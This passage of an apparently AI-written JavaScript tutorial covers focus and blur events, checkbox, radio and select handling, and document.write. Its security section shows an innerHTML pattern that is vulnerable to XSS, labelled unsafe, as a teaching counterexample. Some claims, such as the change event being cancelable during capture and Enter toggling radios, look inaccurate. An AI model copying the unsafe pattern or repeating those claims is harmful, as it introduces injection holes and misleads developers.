To prevent focus programmatically, you must call `element.blur()` immediately in the focus handler (though this creates accessibility issues [Inference]):

```javascript
input.addEventListener('focus', (e) => {
  e.target.blur(); // Immediately remove focus (not recommended)
});
```

A better approach is preventing the action that would cause focus (intercept clicks, prevent tab navigation via `keydown`).

#### Use Cases

Visual feedback (highlighting focused field), displaying contextual help, triggering autocomplete suggestions, form field initialization, accessibility announcements, and focus trap implementation for modal dialogs.

#### Focus Management Best Practices

Avoid removing focus from elements that users are trying to interact with - this causes significant accessibility and usability problems. When implementing custom focus behavior, ensure keyboard users and screen reader users can navigate naturally.

### The `focusin` Event

#### Bubbling Alternative to Focus

The `focusin` event fires when an element is about to receive focus, similar to `focus`, but with one critical difference: **`focusin` bubbles**. This enables event delegation for focus events:

```javascript
form.addEventListener('focusin', (e) => {
  console.log('Something inside the form gained focus:', e.target);
  // This WILL fire when any input inside gains focus
});
```

#### Timing Relative to Focus

`focusin` fires **before** the `focus` event on the same element:

1. `focusin` fires (bubbles up through ancestors)
2. `focus` fires (only on target element)

Both events fire for the same focus action, so you typically only need to listen to one or the other, not both.

#### Event Properties

Uses the same `FocusEvent` interface as `focus`, including the `relatedTarget` property.

#### Use Cases

Event delegation for focus tracking across multiple form fields, monitoring focus within a container, implementing focus-within polyfills, and any scenario where you need focus events to bubble.

### The `blur` Event

#### Focus Loss

The `blur` event fires when an element loses keyboard focus. This occurs when:

- User clicks/taps a different focusable element
- User tabs to a different element
- Programmatic `element.blur()` call
- Programmatic `otherElement.focus()` call shifts focus
- Window/document loses focus (though exact behavior varies [Inference])

#### Relationship with Change Event

For text inputs, the blur timing is significant because it triggers the `change` event if the value was modified. The event order is:

1. `blur` fires on the element losing focus
2. `change` fires on the element losing focus (if value changed)
3. `focus` fires on the element gaining focus

This ordering means `change` handlers run before the next element's `focus` handlers.

#### Event Properties

Uses the `FocusEvent` interface. The `relatedTarget` property indicates which element is **gaining** focus (opposite of focus event):

```javascript
input.addEventListener('blur', (e) => {
  console.log('Lost focus to:', e.relatedTarget);
});
```

#### Does Not Bubble

Like `focus`, the `blur` event **does not bubble**. Use `focusout` for bubbling blur detection.

#### Not Cancelable

The `blur` event is **not cancelable**. Focus has already moved by the time the event fires. To prevent blur, you must intercept the action that would cause focus to move (not generally recommended for accessibility).

#### Use Cases

Validation when user finishes editing a field, hiding autocomplete dropdowns, saving field data, removing focus styling, cleaning up temporary UI elements, and triggering dependent calculations.

#### Common Pitfall: Blur During Interaction

A common issue occurs when clicking a button that appears on focus (like an autocomplete suggestion). The blur event fires when clicking outside the input, potentially hiding the button before the click registers:

```javascript
// Problematic pattern
input.addEventListener('focus', () => {
  button.style.display = 'block';
});

input.addEventListener('blur', () => {
  button.style.display = 'none'; // Hides before click registers
});

// Solution: Delay hiding or use mousedown instead of click
input.addEventListener('blur', () => {
  setTimeout(() => {
    button.style.display = 'none';
  }, 200);
});
```

Better solutions involve `focusout` with `relatedTarget` checking or `mousedown`/`pointerdown` events which fire before blur.

### The `focusout` Event

#### Bubbling Alternative to Blur

The `focusout` event fires when an element is about to lose focus, similar to `blur`, but **bubbles** up the DOM tree:

```javascript
form.addEventListener('focusout', (e) => {
  console.log('Something inside the form lost focus:', e.target);
  console.log('Focus moving to:', e.relatedTarget);
});
```

#### Timing Relative to Blur

`focusout` fires **before** the `blur` event:

1. `focusout` fires (bubbles up through ancestors)
2. `blur` fires (only on target element)
3. `change` fires (if applicable for text inputs)

#### relatedTarget for Click Detection

The `relatedTarget` property in `focusout` enables sophisticated focus tracking. When clicking elements that should not trigger blur-related hiding:

```javascript
container.addEventListener('focusout', (e) => {
  // Check if focus moved to something inside the container
  if (container.contains(e.relatedTarget)) {
    console.log('Focus stayed within container');
    return; // Don't hide dropdown
  }
  
  console.log('Focus left container');
  hideDropdown();
});
```

#### Use Cases

Event delegation for blur handling, focus trap implementations, dropdown/popup management, form section validation, and any scenario where you need to respond to focus leaving a container.

### Event Delegation Patterns

#### Monitoring Form Activity

Using bubbling focus/input events for centralized form handling:

```javascript
form.addEventListener('focusin', (e) => {
  if (e.target.matches('input, textarea, select')) {
    e.target.classList.add('focused-field');
    showContextualHelp(e.target);
  }
});

form.addEventListener('focusout', (e) => {
  if (e.target.matches('input, textarea, select')) {
    e.target.classList.remove('focused-field');
    hideContextualHelp();
  }
});

form.addEventListener('input', (e) => {
  if (e.target.matches('input, textarea, select')) {
    validateField(e.target);
    updateCharacterCount(e.target);
  }
});

form.addEventListener('change', (e) => {
  if (e.target.matches('input, textarea, select')) {
    saveFieldData(e.target);
  }
});
```

#### Dynamic Content Handling

Event delegation automatically handles dynamically added elements:

```javascript
// Works for elements added after listener registration
document.addEventListener('input', (e) => {
  if (e.target.matches('.autocomplete-input')) {
    fetchSuggestions(e.target.value);
  }
});
```

### Focus Trap Implementation

Implementing accessible modal focus trapping requires coordinating focus and keyboard events:

```javascript
const modal = document.querySelector('.modal');
const focusableElements = modal.querySelectorAll(
  'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
);
const firstFocusable = focusableElements[0];
const lastFocusable = focusableElements[focusableElements.length - 1];

modal.addEventListener('keydown', (e) => {
  if (e.key !== 'Tab') return;
  
  if (e.shiftKey) { // Shift + Tab
    if (document.activeElement === firstFocusable) {
      e.preventDefault();
      lastFocusable.focus();
    }
  } else { // Tab
    if (document.activeElement === lastFocusable) {
      e.preventDefault();
      firstFocusable.focus();
    }
  }
});

// Return focus when closing
let previousFocus;
modal.addEventListener('focusin', (e) => {
  if (!previousFocus && !modal.contains(e.relatedTarget)) {
    previousFocus = e.relatedTarget;
  }
});

function closeModal() {
  modal.hidden = true;
  if (previousFocus) {
    previousFocus.focus();
  }
}
```

### Input Validation Patterns

#### Real-Time Validation with Input

```javascript
emailInput.addEventListener('input', (e) => {
  const value = e.target.value;
  const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  
  e.target.classList.toggle('invalid', !isValid && value.length > 0);
  updateErrorMessage(e.target, isValid);
});
```

#### Final Validation with Change

```javascript
emailInput.addEventListener('change', (e) => {
  const value = e.target.value;
  const isValid = validateEmail(value);
  
  if (!isValid) {
    e.target.setCustomValidity('Invalid email address');
    e.target.reportValidity();
  } else {
    e.target.setCustomValidity('');
  }
});
```

#### Input Restriction with beforeinput

```javascript
numericInput.addEventListener('beforeinput', (e) => {
  // Allow only digits, backspace, delete
  if (e.inputType === 'insertText') {
    if (!/^\d$/.test(e.data)) {
      e.preventDefault();
    }
  }
  // Allow other input types (delete, paste might need additional handling)
});
```

### Composition Handling for International Input

Proper handling of IME composition prevents premature actions:

```javascript
let isComposing = false;

input.addEventListener('compositionstart', () => {
  isComposing = true;
});

input.addEventListener('compositionend', () => {
  isComposing = false;
  handleFinalInput(input.value);
});

input.addEventListener('input', (e) => {
  if (isComposing) {
    return; // Wait for composition to complete
  }
  handleFinalInput(e.target.value);
});
```

Alternatively, check `e.isComposing` directly in the `input` handler:

```javascript
input.addEventListener('input', (e) => {
  if (e.isComposing) return;
  handleFinalInput(e.target.value);
});
```

### Browser Inconsistencies

#### Input Event Timing

Some browsers may fire `input` events at slightly different times for the same user action [Unverified]. Range inputs and contenteditable elements show the most variation. Testing across browsers is necessary for precise timing requirements.

#### Focus During Page Load

The timing of focus events during initial page load, especially with autofocus attributes, can vary across browsers [Inference]. Scripts that depend on focus state immediately on load may need to check `document.activeElement` directly rather than relying solely on focus events.

#### Blur/Focusout on Window Blur

When the browser window or tab loses focus, whether blur events fire on the currently focused element varies by browser [Unverified]. Some fire blur immediately, some delay until focus returns and moves to a different element.

### Performance Optimization

#### Debouncing Input Events

For expensive operations on input:

```javascript
let debounceTimer;
input.addEventListener('input', (e) => {
  clearTimeout(debounceTimer);
  debounceTimer = setTimeout(() => {
    expensiveOperation(e.target.value);
  }, 300);
});
```

#### Throttling Input Events

For operations that should run periodically during input:

```javascript
let lastRun = 0;
const throttleMs = 200;

input.addEventListener('input', (e) => {
  const now = Date.now();
  if (now - lastRun >= throttleMs) {
    periodicOperation(e.target.value);
    lastRun = now;
  }
});
```

#### Passive Event Listeners

For focus/blur event listeners that don't call `preventDefault()` (which has no effect anyway), consider passive listeners for potential performance gains [Inference]:

```javascript
element.addEventListener('focus', handler, { passive: true });
```

---

## Checkbox and Radio Button Handling

### Checkbox State Management

Checkboxes maintain a binary state accessible through the `checked` property. Reading `element.checked` returns `true` or `false`. Setting `element.checked = true` or `element.checked = false` programmatically changes the state.

The `value` attribute defines what gets submitted with forms but does not reflect the checked state. The default value is "on" if not specified. The actual submitted data depends on the `checked` state, not the `value` alone.

```javascript
const checkbox = document.getElementById('myCheckbox');
checkbox.checked = true; // Check the box
const isChecked = checkbox.checked; // Read state
const submittedValue = checkbox.value; // Get the value attribute
```

### Radio Button Groups

Radio buttons sharing the same `name` attribute form a mutually exclusive group. Only one radio button within a group can be checked at any time. Checking one radio button automatically unchecks others in the same group.

```html
<input type="radio" name="choice" value="option1">
<input type="radio" name="choice" value="option2">
<input type="radio" name="choice" value="option3">
```

Radio buttons with different `name` attributes operate independently and do not affect each other.

### Accessing Checked Radio Button

Finding the selected radio button in a group requires querying all buttons with that name:

```javascript
const selectedRadio = document.querySelector('input[name="choice"]:checked');
const selectedValue = selectedRadio ? selectedRadio.value : null;
```

Alternatively, iterate through all radio buttons in the group:

```javascript
const radios = document.getElementsByName('choice');
let selectedValue;
for (let radio of radios) {
  if (radio.checked) {
    selectedValue = radio.value;
    break;
  }
}
```

Using `RadioNodeList` from forms:

```javascript
const form = document.getElementById('myForm');
const selectedValue = form.elements['choice'].value; // Returns checked radio's value
```

### Change Event Handling

The `change` event fires when a checkbox or radio button's state changes through user interaction. For checkboxes, this occurs on each toggle. For radio buttons, it fires when a new selection is made.

```javascript
checkbox.addEventListener('change', function(event) {
  console.log('Checked:', event.target.checked);
});

radioButton.addEventListener('change', function(event) {
  console.log('Selected value:', event.target.value);
});
```

The `change` event bubbles, allowing delegation:

```javascript
form.addEventListener('change', function(event) {
  if (event.target.type === 'checkbox') {
    // Handle checkbox change
  } else if (event.target.type === 'radio') {
    // Handle radio change
  }
});
```

### Click vs Change Events

The `click` event fires on every click, even if the state doesn't change (clicking an already-checked radio button triggers `click` but not `change`). The `change` event only fires when the checked state actually changes.

For radio buttons, `change` fires on the newly selected button but not on the previously selected button that gets unchecked. The `click` event fires on both.

### Input Event Behavior

The `input` event does not fire for checkboxes or radio buttons. Use `change` instead for detecting state changes.

### Indeterminate State

Checkboxes support an indeterminate (mixed) state distinct from checked or unchecked. This state must be set programmatically via the `indeterminate` property and does not persist through form submission.

```javascript
checkbox.indeterminate = true; // Visual indeterminate state
```

The `indeterminate` state is visual only. The underlying `checked` property remains either `true` or `false`. This state commonly represents partial selection in hierarchical lists where some but not all child items are selected.

Clicking an indeterminate checkbox clears the indeterminate state and toggles the checked property normally.

### Programmatic State Changes

Setting `checked` programmatically does not trigger `change` or `click` events. Events only fire from user interaction. To trigger handlers when programmatically changing state, dispatch events manually:

```javascript
checkbox.checked = true;
checkbox.dispatchEvent(new Event('change', { bubbles: true }));
```

### Form Submission Behavior

Checked checkboxes and the selected radio button submit their `value` attributes with the form. Unchecked checkboxes submit nothing. Radio button groups submit only the checked radio's value, or nothing if no radio is selected.

```html
<!-- If checked, submits: agree=yes -->
<input type="checkbox" name="agree" value="yes" checked>

<!-- Submits: choice=option2 -->
<input type="radio" name="choice" value="option1">
<input type="radio" name="choice" value="option2" checked>
<input type="radio" name="choice" value="option3">
```

### Getting All Checked Checkboxes

Retrieving multiple checked checkboxes from a group or form:

```javascript
const checkedBoxes = document.querySelectorAll('input[type="checkbox"]:checked');
const values = Array.from(checkedBoxes).map(cb => cb.value);
```

With a specific name:

```javascript
const checkedBoxes = document.querySelectorAll('input[name="options"]:checked');
```

### Default Checked State

The `defaultChecked` property reflects the presence of the `checked` attribute in HTML, while `checked` reflects the current state. Resetting to the original state:

```javascript
checkbox.checked = checkbox.defaultChecked;
```

Form reset operations restore inputs to their `defaultChecked` state automatically.

### Label Association

Clicking a `<label>` associated with a checkbox or radio button toggles the input. Association occurs through matching `for` attribute and `id`:

```html
<input type="checkbox" id="agree">
<label for="agree">I agree</label>
```

Or by nesting:

```html
<label>
  <input type="checkbox">
  I agree
</label>
```

Click events on labels propagate to their associated inputs. Stopping propagation on the label prevents the input from toggling.

### Accessibility Attributes

The `aria-checked` attribute can be used on custom checkbox implementations but is unnecessary on native inputs. Screen readers automatically announce the checked state of native checkboxes and radio buttons.

The `aria-describedby` and `aria-labelledby` attributes enhance accessibility by associating additional descriptive text:

```html
<input type="checkbox" id="terms" aria-describedby="terms-desc">
<span id="terms-desc">You must agree to continue</span>
```

### CSS Pseudo-Classes

The `:checked` pseudo-class selects checked checkboxes and radio buttons:

```css
input[type="checkbox"]:checked {
  /* Styles for checked checkboxes */
}

input[type="radio"]:checked + label {
  /* Styles for labels of checked radios */
}
```

The `:indeterminate` pseudo-class targets checkboxes in the indeterminate state.

### Validation

Required checkboxes and radio buttons use the `required` attribute. For checkboxes, `required` means the checkbox must be checked. For radio groups, at least one radio must be selected.

```html
<input type="checkbox" name="agree" required>
<input type="radio" name="choice" value="a" required>
<input type="radio" name="choice" value="b">
```

Checking validity programmatically:

```javascript
if (!checkbox.validity.valid) {
  console.log('Checkbox must be checked');
}

const radioGroup = document.getElementsByName('choice');
const isValid = Array.from(radioGroup).some(radio => radio.checked);
```

### Handling Radio Button Deselection

[Inference] Native radio buttons cannot be deselected by clicking the same button again. Implementing deselection requires custom JavaScript:

```javascript
let lastChecked = null;

radios.forEach(radio => {
  radio.addEventListener('click', function() {
    if (this === lastChecked) {
      this.checked = false;
      lastChecked = null;
    } else {
      lastChecked = this;
    }
  });
});
```

[Unverified] This pattern is not standard browser behavior and may conflict with user expectations for radio button interaction.

### Performance with Large Groups

For forms with many checkboxes or radio buttons, event delegation on a container element reduces memory overhead compared to individual listeners on each input:

```javascript
container.addEventListener('change', function(event) {
  if (event.target.type === 'checkbox' || event.target.type === 'radio') {
    // Handle state change
  }
});
```

### FormData API Integration

The FormData API automatically includes checked checkboxes and the selected radio button:

```javascript
const form = document.getElementById('myForm');
const formData = new FormData(form);

// Iterate entries
for (let [name, value] of formData.entries()) {
  console.log(name, value);
}
```

Unchecked checkboxes do not appear in FormData. Radio groups with no selection also do not appear.

### Custom Styling and Hidden Inputs

Custom-styled checkboxes and radio buttons typically hide the native input and style a sibling element:

```css
input[type="checkbox"] {
  position: absolute;
  opacity: 0;
}

input[type="checkbox"] + .custom-checkbox {
  /* Custom styles */
}

input[type="checkbox"]:checked + .custom-checkbox {
  /* Checked state styles */
}
```

The native input remains in the DOM for form submission and accessibility. Keyboard interaction and screen reader functionality continue working through the hidden native input.

### Keyboard Interaction

Native checkboxes toggle with the Space key. Radio buttons navigate with arrow keys (within the same name group) and toggle with Space or Enter. Tab key moves between different form controls.

[Inference] Custom implementations must replicate this keyboard behavior to maintain accessibility standards. Failing to do so creates barriers for keyboard-only users.

### State Synchronization Across Multiple Checkboxes

Implementing "select all" functionality with checkboxes:

```javascript
const selectAll = document.getElementById('selectAll');
const checkboxes = document.querySelectorAll('.item-checkbox');

selectAll.addEventListener('change', function() {
  checkboxes.forEach(cb => cb.checked = this.checked);
});

checkboxes.forEach(cb => {
  cb.addEventListener('change', function() {
    selectAll.checked = Array.from(checkboxes).every(cb => cb.checked);
    selectAll.indeterminate = Array.from(checkboxes).some(cb => cb.checked) && 
                              !Array.from(checkboxes).every(cb => cb.checked);
  });
});
```

### Storage and Persistence

Persisting checkbox and radio button states across page loads:

```javascript
// Save state
checkbox.addEventListener('change', function() {
  localStorage.setItem(this.id, this.checked);
});

// Restore state
const savedState = localStorage.getItem(checkbox.id);
if (savedState !== null) {
  checkbox.checked = savedState === 'true';
}
```

For radio groups:

```javascript
// Save
radioButton.addEventListener('change', function() {
  localStorage.setItem(this.name, this.value);
});

// Restore
const savedValue = localStorage.getItem('radioGroupName');
if (savedValue) {
  const radio = document.querySelector(`input[name="radioGroupName"][value="${savedValue}"]`);
  if (radio) radio.checked = true;
}
```

---

## Select and Option Elements

### DOM Structure and Relationships

The `<select>` element creates a dropdown control containing `<option>` elements as its children. Options can be grouped using `<optgroup>` elements, creating a three-level hierarchy: select → optgroup → option.

```html
<select id="country">
  <optgroup label="North America">
    <option value="us">United States</option>
    <option value="ca">Canada</option>
  </optgroup>
  <optgroup label="Europe">
    <option value="uk">United Kingdom</option>
    <option value="de">Germany</option>
  </optgroup>
</select>
```

The `<select>` element maintains references to its options through the `options` HTMLOptionsCollection, a live collection that updates automatically as options are added or removed.

### HTMLSelectElement Properties

#### Selection State

- `selectedIndex`: Zero-based index of the first selected option, or `-1` if none selected
- `selectedOptions`: HTMLCollection of all selected `<option>` elements (multiple selections in multi-select)
- `value`: The `value` attribute of the first selected option, or its text content if no value attribute exists
- `multiple`: Boolean indicating whether multiple selections are allowed

```javascript
const select = document.getElementById('country');
console.log(select.value);           // "us"
console.log(select.selectedIndex);   // 0
console.log(select.selectedOptions); // HTMLCollection [option]
```

#### Options Management

- `options`: Live HTMLOptionsCollection of all option elements
- `length`: Number of options in the select (read/write - setting truncates or pads with null)
- `add(option, before)`: Inserts an option before the specified element or at the end
- `remove(index)`: Removes the option at the specified index

```javascript
// Add option at end
const newOption = new Option('Mexico', 'mx');
select.add(newOption);

// Add option before index 2
const anotherOption = new Option('France', 'fr');
select.add(anotherOption, select.options[2]);

// Remove by index
select.remove(0);
```

#### Form Integration

- `form`: Reference to the containing `<form>` element, or `null`
- `name`: The name attribute used for form submission
- `disabled`: Boolean disabling the entire select
- `required`: Boolean indicating whether selection is required for form validation
- `validity`: ValidityState object for constraint validation
- `validationMessage`: Browser-generated validation message

### HTMLOptionElement Properties

#### Core Attributes

- `value`: The value submitted with the form (defaults to text content if not specified)
- `text`: The text content displayed to users (equivalent to `textContent`)
- `label`: Optional label that can override displayed text in some browsers
- `selected`: Boolean indicating selection state
- `disabled`: Boolean disabling the individual option
- `defaultSelected`: Boolean reflecting the `selected` attribute in HTML (initial state)

```javascript
const option = document.querySelector('option[value="us"]');
option.selected = true;           // Select this option
console.log(option.text);         // "United States"
console.log(option.value);        // "us"
console.log(option.index);        // Position in options collection
```

#### Relationships

- `index`: Zero-based position within the parent select's options collection
- `form`: Reference to the ancestor `<form>` element
- `parentNode`: Parent element (select or optgroup)

### Option Constructor

The `Option()` constructor creates new option elements without requiring `document.createElement()`:

```javascript
new Option(text, value, defaultSelected, selected)
```

Parameters (all optional):

- `text`: Display text (defaults to empty string)
- `value`: Value attribute (defaults to empty string)
- `defaultSelected`: Sets the `selected` HTML attribute (defaults to false)
- `selected`: Sets the current selection state (defaults to false)

```javascript
const opt = new Option('Canada', 'ca', false, true);
// Equivalent to:
// <option value="ca" selected>Canada</option>
// And the option is currently selected in the DOM
```

### Multiple Selection

Setting `multiple` attribute converts the select to a multi-select listbox:

```html
<select multiple size="4">
  <option value="1">Option 1</option>
  <option value="2">Option 2</option>
  <option value="3">Option 3</option>
</select>
```

For multiple selections:

- Users hold Ctrl/Cmd or Shift to select multiple items
- `selectedIndex` returns only the first selected option's index
- `selectedOptions` contains all selected options
- Getting `value` returns only the first selected option's value

```javascript
const multiSelect = document.getElementById('multi');

// Get all selected values
const values = Array.from(multiSelect.selectedOptions)
  .map(opt => opt.value);

// Set multiple selections
multiSelect.options[0].selected = true;
multiSelect.options[2].selected = true;
```

### Events

#### change Event

Fires when the user commits a selection change. For single selects, fires immediately on selection. For multi-selects, fires when focus leaves the control or Enter is pressed.

```javascript
select.addEventListener('change', (e) => {
  console.log('Selected:', e.target.value);
});
```

The `change` event bubbles and is cancelable during the capture phase only (before reaching target).

#### input Event

Modern browsers fire `input` events on select elements, though behavior varies:

- Some browsers fire `input` for every selection change
- Others fire only `change`
- **[Unverified]**: Consistent `input` event behavior across all browsers for select elements

For maximum compatibility, rely on `change` rather than `input` for select elements.

#### focus and blur

Standard focus events work on select elements:

```javascript
select.addEventListener('focus', () => {
  console.log('Select focused');
});

select.addEventListener('blur', () => {
  console.log('Selection committed');
});
```

### Styling Limitations

Native select elements have severe styling restrictions due to platform-specific rendering:

- Limited control over dropdown appearance
- `<option>` elements cannot contain HTML (text only)
- No direct styling of dropdown list in most browsers
- `appearance: none` removes default styling but requires complete custom implementation

```css
/* Basic select styling */
select {
  appearance: none;
  background: white;
  border: 1px solid #ccc;
  padding: 8px;
  /* Custom dropdown arrow required */
}

/* Option styling has minimal support */
option {
  color: black; /* Limited properties work */
}

option:disabled {
  color: #999;
}
```

**[Inference]**: Browser vendors intentionally limit select styling to maintain native OS integration and accessibility features.

### Programmatic Manipulation

#### Clearing All Options

```javascript
// Method 1: Set length to 0
select.length = 0;

// Method 2: Remove all children
while (select.firstChild) {
  select.removeChild(select.firstChild);
}

// Method 3: Set innerHTML (works but not recommended)
select.innerHTML = '';
```

#### Bulk Option Addition

```javascript
const data = [
  { value: 'us', text: 'United States' },
  { value: 'ca', text: 'Canada' },
  { value: 'mx', text: 'Mexico' }
];

// Using DocumentFragment for performance
const fragment = document.createDocumentFragment();
data.forEach(item => {
  fragment.appendChild(new Option(item.text, item.value));
});
select.appendChild(fragment);
```

#### Reordering Options

```javascript
// Move option to specific position
const option = select.options[3];
select.remove(3);
select.add(option, select.options[0]); // Insert at beginning
```

#### Finding Options

```javascript
// By value
const option = Array.from(select.options)
  .find(opt => opt.value === 'us');

// By text
const option = Array.from(select.options)
  .find(opt => opt.text === 'United States');

// Using querySelector
const option = select.querySelector('option[value="us"]');
```

### Form Submission Behavior

#### Single Select

Submits a single name-value pair:

```html
<select name="country">
  <option value="us" selected>United States</option>
</select>
<!-- Submits: country=us -->
```

If no option is selected and no default:

- Without `required`: Submits first option's value
- With `required`: Form validation fails

#### Multiple Select

Submits multiple name-value pairs with the same name:

```html
<select name="countries" multiple>
  <option value="us" selected>United States</option>
  <option value="ca" selected>Canada</option>
</select>
<!-- Submits: countries=us&countries=ca -->
```

Server-side handling typically requires array parsing (e.g., `countries[]` naming convention in PHP).

#### Empty Values

```html
<option value="">Select a country</option>
<option>United States</option>
```

- Empty string value: Submits `name=` (empty value)
- No value attribute: Submits text content as value

### Optgroup Element

#### Structure and Properties

```html
<select>
  <optgroup label="Group 1" disabled>
    <option value="1">Option 1</option>
  </optgroup>
</select>
```

HTMLOptGroupElement properties:

- `label`: Required display text for the group
- `disabled`: Boolean disabling all child options
- `parentNode`: Reference to parent select element

Optgroups cannot be nested. Options within disabled optgroups are not selectable but remain in the options collection.

#### Styling Optgroups

```css
optgroup {
  font-weight: bold;
  font-style: italic;
  color: #666;
}

/* Child options inherit from optgroup */
optgroup option {
  font-weight: normal;
  padding-left: 20px;
}
```

### Accessibility Considerations

#### Required Attributes

```html
<label for="country">Country:</label>
<select id="country" name="country" required aria-required="true">
  <option value="">Select a country</option>
  <option value="us">United States</option>
</select>
```

- Always associate labels using `for`/`id` relationship
- Use first option as placeholder with empty value
- `required` attribute for validation
- `aria-required` for assistive technology (though `required` implies this)

#### Keyboard Navigation

Standard keyboard behavior:

- Arrow keys: Navigate options
- Home/End: Jump to first/last option
- Type-ahead: Jump to option starting with typed character
- Space/Enter: Open dropdown (when closed) or select option (when open)
- Escape: Close dropdown without changing selection

#### Screen Reader Announcements

Screen readers announce:

- Select element name/label
- Current selection
- Number of options (in some screen readers)
- Optgroup labels when navigating grouped options

For multi-selects, announce "X of Y selected" pattern:

```html
<select multiple aria-label="Countries (2 of 5 selected)">
  <!-- Dynamic update of aria-label with selection count -->
</select>
```

### Size Attribute

The `size` attribute controls visible options in the rendered control:

```html
<!-- Dropdown (default) -->
<select>...</select>

<!-- Listbox showing 4 items -->
<select size="4">...</select>
```

- `size="1"` or unspecified: Renders as dropdown
- `size > 1`: Renders as scrollable listbox
- Multiple selects default to `size="4"` if unspecified

### Validation API

#### Constraint Validation

```javascript
const select = document.getElementById('country');

// Check validity
if (!select.checkValidity()) {
  console.log(select.validationMessage);
  // "Please select an item in the list."
}

// Custom validation
select.setCustomValidity('This country is not available');
console.log(select.validity.customError); // true

// Clear custom validation
select.setCustomValidity('');
```

#### ValidityState Properties

For select elements:

- `valueMissing`: True when `required` but no selection
- `customError`: True when custom validation message is set
- `valid`: True when all constraints pass

Other ValidityState properties (`typeMismatch`, `patternMismatch`, etc.) do not apply to select elements.

### Performance Considerations

#### Large Option Lists

For selects with hundreds or thousands of options:

```javascript
// Use DocumentFragment to minimize reflows
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  fragment.appendChild(new Option(`Option ${i}`, i));
}
select.appendChild(fragment); // Single reflow
```

**[Inference]**: Native select elements may struggle with 10,000+ options, causing rendering delays and poor user experience. Consider virtual scrolling alternatives or autocomplete inputs for large datasets.

#### Virtual Scrolling Alternative

Native selects don't support virtual scrolling. For massive datasets, implement custom dropdown using:

- ARIA combobox pattern
- Virtual scrolling library
- Progressive loading

### Mobile Considerations

Mobile browsers render select elements using native OS pickers:

- iOS: Scrollable wheel picker
- Android: Native dialog picker
- Custom styling often ignored on mobile

```html
<!-- Size attribute ignored on mobile -->
<select size="10">
  <!-- Will still use native picker -->
</select>
```

Mobile pickers typically provide better UX than custom implementations due to platform integration and accessibility features.

### Common Patterns

#### Dependent Dropdowns

```javascript
const countrySelect = document.getElementById('country');
const stateSelect = document.getElementById('state');

const statesByCountry = {
  us: ['California', 'Texas', 'New York'],
  ca: ['Ontario', 'Quebec', 'British Columbia']
};

countrySelect.addEventListener('change', (e) => {
  const country = e.target.value;
  
  // Clear existing options
  stateSelect.length = 0;
  
  // Add placeholder
  stateSelect.add(new Option('Select a state', ''));
  
  // Populate dependent options
  if (statesByCountry[country]) {
    statesByCountry[country].forEach(state => {
      stateSelect.add(new Option(state, state.toLowerCase()));
    });
  }
  
  stateSelect.disabled = !country;
});
```

#### Searchable Select

Native selects provide basic type-ahead, but for enhanced search:

```javascript
// Custom filter on typing
let searchTimeout;
document.addEventListener('keydown', (e) => {
  if (document.activeElement.tagName !== 'SELECT') return;
  
  clearTimeout(searchTimeout);
  searchTimeout = setTimeout(() => {
    // Native type-ahead handles this
    // Custom implementation would require replacing with custom dropdown
  }, 300);
});
```

For true searchable selects, replace with custom implementations using libraries like Select2, Choices.js, or native `<datalist>` with `<input>`.

#### Select All for Multi-Select

```javascript
function toggleSelectAll(select, checked) {
  Array.from(select.options).forEach(option => {
    option.selected = checked;
  });
  
  // Trigger change event
  select.dispatchEvent(new Event('change', { bubbles: true }));
}

// Usage
const checkbox = document.getElementById('selectAll');
checkbox.addEventListener('change', (e) => {
  toggleSelectAll(multiSelect, e.target.checked);
});
```

### Compatibility with Frameworks

#### React Controlled Components

```javascript
function CountrySelect({ value, onChange }) {
  return (
    <select value={value} onChange={(e) => onChange(e.target.value)}>
      <option value="">Select</option>
      <option value="us">United States</option>
      <option value="ca">Canada</option>
    </select>
  );
}
```

React requires `value` prop for controlled selects. Setting `selected` on options is ignored in controlled components.

#### Vue v-model

```javascript
<select v-model="selectedCountry">
  <option value="us">United States</option>
  <option value="ca">Canada</option>
</select>
```

Vue's `v-model` automatically manages the `value` property and `change` event binding.

### Security Considerations

#### XSS Prevention

When dynamically adding options from user input or API responses:

```javascript
// UNSAFE - if text contains HTML
select.innerHTML = `<option value="${value}">${text}</option>`;

// SAFE - text is automatically escaped
select.add(new Option(text, value));

// SAFE - using textContent
const option = document.createElement('option');
option.value = value;
option.textContent = text; // Escaped automatically
select.appendChild(option);
```

The `Option()` constructor and `textContent` automatically escape HTML, preventing XSS attacks.

#### Value Validation

Always validate selected values server-side, as users can manipulate client-side options:

```javascript
// Client-side validation insufficient
select.addEventListener('change', (e) => {
  const validValues = ['us', 'ca', 'mx'];
  if (!validValues.includes(e.target.value)) {
    e.target.setCustomValidity('Invalid selection');
  }
});
```

Attackers can modify option values or submit arbitrary values via browser tools, bypassing client-side validation entirely.

---

# Document Manipulation

## document.write

### Core Mechanism

`document.write()` is a method that writes a string of text directly into the document stream during HTML parsing. It inserts content at the current position in the document where the script executes.

**Basic syntax:**

```javascript
document.write(markup);
document.write(text1, text2, text3, ...);
```

The method converts all arguments to strings and writes them sequentially to the document.

### Behavior During Parsing vs. After Load

**During initial page load (parsing):**

```html
<body>
  <h1>Title</h1>
  <script>
    document.write('<p>Inserted during parsing</p>');
  </script>
  <footer>Footer</footer>
</body>
<!-- Result: Title → paragraph → Footer -->
```

The content is inserted inline at the script's location in the document tree.

**After page load (document closed):**

```javascript
window.addEventListener('load', () => {
  document.write('<p>Written after load</p>');
});
// Replaces entire document content
```

When called after the document finishes parsing and the document stream closes, `document.write()` implicitly calls `document.open()`, which **clears the entire document** and starts a new one.

### Document Stream States

The document has two primary states:

**Open state (parsing):**

- HTML parser is actively processing the document
- `document.write()` inserts content into the current parse position
- Document structure is being built

**Closed state (parsing complete):**

- HTML parsing finished
- DOM tree fully constructed
- `document.write()` reopens and clears the document

### Why document.write() is Problematic

#### 1. Parser Blocking

`document.write()` in synchronous scripts blocks HTML parsing completely:

```html
<body>
  <h1>Title</h1>
  <script src="external.js"></script>
  <!-- Parser blocks here waiting for script -->
  <p>Content after script</p>
</body>
```

If `external.js` contains `document.write()`, the parser must:

1. Stop parsing
2. Download and execute the script
3. Process the written content
4. Resume parsing

This creates cascading delays, especially with slow network connections.

#### 2. Chrome Intervention for Slow Connections

Chrome (and other browsers) actively block `document.write()` in certain conditions:

**Blocked scenarios:**

- `<script>` tag with `document.write()` for parser-blocking scripts
- On 2G connections or slower
- User is on a page loaded via HTTPS but script loads via HTTP
- Cross-origin scripts using `document.write()`

**Console warning:**

```
A Parser-blocking, cross-origin script is invoked via document.write. 
This may be blocked by the browser if the connection is not good.
```

